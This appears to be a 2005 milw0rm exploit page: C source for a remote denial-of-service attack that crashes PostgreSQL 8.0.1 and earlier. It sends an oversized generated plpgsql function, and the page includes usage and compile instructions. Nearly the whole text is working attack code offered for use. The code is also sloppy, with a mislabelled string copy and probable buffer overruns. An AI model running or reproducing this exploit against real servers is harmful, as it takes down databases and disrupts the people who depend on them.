<html><head><title>PostgreSQL <= 8.01 Remote Reboot Denial of Service Exploit</title></head><pre>/* PostgreSQL Remote Reboot &lt;=8.01 
 * writen by ChoiX [choix@unl0ck.org]
 * (c) Unl0ck Research Team [www.unl0ck.org]
 *	info: Server can be rebooted only if plpgsql language is switched on.
 *		To compilate exploit you should have &quot;libpq&quot; library on your box 
 *		and use command $ cc -o pgsql_reboot pgsql_reboot.c -I/usr/local/pgsql/include  -L/usr/local/pgsql/lib -lpq
 *		Root exploits will be released later, coz now it's very dangerous to release it.
 *	greets to: 
 *			unl0ck members: DarkEagle, crash-x, nekd0, xtix, [0xdeadbabe]
 *			m00 members: ov3r 
 */
#include &lt;stdio.h&gt;
#include &lt;getopt.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;libpq-fe.h&gt;

#define DEFAULT_PORT &quot;5321&quot;
#define DEFAULT_DB &quot;postgresql&quot;
#define FUNC_NAME &quot;uKt_test&quot;
#define TABLE_NAME &quot;unl0ck_table&quot; 

char str[4000];
char create[]=&quot;CREATE OR REPLACE FUNCTION %s RETURNS integer AS $$\n&quot;;
char declare[] = &quot;DECLARE\n&quot;;
char com[] = &quot;\t--%\n&quot;;
char varible_REC[] = &quot;\trec RECORD;\n&quot;;
char varible_var[] = &quot;\tvar%d varchar := \'BBBB\';\n&quot;;
char begin[] = &quot;BEGIN\n&quot;;
char select_1[] = &quot;SELECT INTO rec FROM %s WHERE\n&quot;;
char select_2[] = &quot;var%d = AAAA AND\n&quot;;
char select_3[] = &quot;var1029 = AAAA;\n&quot;;
char end[] = &quot;END\n&quot;;
char finish[] = &quot;$$ LANGUAGE plpgsql\n&quot;;


void usage(char *name){
printf(&quot;PostgreSQL Remote DoS &lt;=8.0.1\n&quot;);
printf(&quot;writen by ChoiX [choix@unl0ck.org]\n&quot;);
printf(&quot;(c) Unl0ck Research Team [info@unl0ck.org]\n&quot;);
printf(&quot;Usage: %s -H &lt;host_address&gt; [-P &lt;port&gt;] -u &lt;user_name&gt; -p &lt;password&gt; [-d &lt;database_name&gt;] \n&quot;, name);
printf(&quot;Default port = %s\nDefault dbname = %s\n&quot;, DEFAULT_PORT, DEFAULT_DB);
exit(0);
}

int make_str();

int main(int argc, char *argv[]){
char opt;
char *host = NULL, *port = NULL, *user = NULL, *password = NULL, *dbname = NULL;
struct hostent *he;
PGconn *conn;
PGresult *res;

while((opt = getopt(argc, argv, &quot;H:P:u:p:d:&quot;)) != EOF){
	switch(opt){
		case 'H':
			host = optarg;
			break;
		case 'P':
			port = optarg;
			break;
		case 'u':
			user = optarg;
			break;
		case 'p':
			password = optarg;
			break;
		case 'd':
			dbname = optarg;
			break;
		default:
			usage(argv[0]);
			break;
	}
}
if(host == NULL) usage(argv[0]);
if(user == NULL) usage(argv[0]);
if(password == NULL) usage(argv[0]);
if(port == NULL) port = DEFAULT_PORT; 
if(dbname == NULL) dbname = DEFAULT_DB;

printf(&quot;\tPostgreSQL Remote DoS &lt;=8.0.1\n&quot;);
printf(&quot;[*] Host/Port: %s/%s\n&quot;, host, port);
printf(&quot;[*] DBname/User/Password: %s/%s/%s\n&quot;, dbname, user, password); 

conn = PQsetdbLogin(host, port, NULL, NULL, dbname, user, password);
if(PQstatus(conn) == CONNECTION_BAD){
	PQfinish(conn);
	printf(&quot;[-] Cannot connect to the database\n&quot;);
	exit(1);
}
printf(&quot;[+] Connected to the database\n&quot;);

make_str();
printf(&quot;[+] Command has been generated\n&quot;);
res = PQexec(conn, str);
if (PQresultStatus(res) == PGRES_TUPLES_OK){
	printf(&quot;[+] Command has been sent\n&quot;);
}
if(PQstatus(conn) == CONNECTION_BAD){
	printf(&quot;[+] Server has been rebooted\n&quot;);
	exit(0);
} else {
	printf(&quot;[-] Server hasnt been rebooted\n&quot;);
	exit(0);
}
}

int make_str(){
char temp[100];
int i;
int len = sizeof(temp) -1;

//write char create[]
snprintf(temp, len, create, FUNC_NAME); 
strcpy(str,temp);
//write char declare[] 
snprintf(temp, len, begin);
strcat(str, temp);
//write char varible_REC[]
snprintf(temp, len, varible_REC);
strcat(str, temp);
//write char varible_var[]
for(i = 0;i &lt; 1029;i++){
	snprintf(temp, len, varible_var, i);
	strcat(str, temp);
}
//write char begin[]
snprintf(temp, len, begin);
strcat(str, temp);
//write char select_1[]
snprintf(temp, len, select_1, TABLE_NAME);
strcat(str, temp);
//write char select_2[]
for(i = 0;i &lt; 1028;i++){
	snprintf(temp, len, select_2, i);
	strcat(str, temp);
}
//write char select_3[]
snprintf(temp, len, select_3);
strcat(str, temp);
//write char end[]
snprintf(temp, len, temp);
strcat(str, temp);
//write char finish[]
snprintf(temp, len, finish);
strcat(str,temp);

return 0;
}



// milw0rm.com [2005-04-19]</pre></html>